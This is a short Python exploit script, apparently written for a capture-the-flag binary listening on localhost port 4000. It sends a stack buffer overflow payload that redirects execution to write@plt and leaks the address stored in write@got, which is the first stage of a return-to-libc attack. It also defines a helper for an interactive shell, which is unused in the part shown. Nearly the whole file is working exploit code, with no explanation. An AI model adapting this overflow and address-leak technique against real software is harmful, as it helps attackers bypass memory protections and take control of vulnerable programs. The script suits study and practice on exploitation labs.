import socket
import time
import os
import struct
import telnetlib

def connect(ip, port):
    return socket.create_connection((ip, port))

def p(x):
    return struct.pack('<I', x)

def u(x):
    return struct.unpack('<I', x)[0]

def interact(s):
    print('---- interactive mode -----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

write_plt = 0x8048370
write_got = 0x804a01c

s = connect('127.0.0.1', 4000)

payload = b''.join([
    b'A' * 51,
    p(write_plt),
    b'BBBB',
    p(1),
    p(write_got),
    p(4),
])

print(s.recv(1024).decode('utf-8'))
s.send(payload + b'\n')
print(hex(u(s.recv(4))))

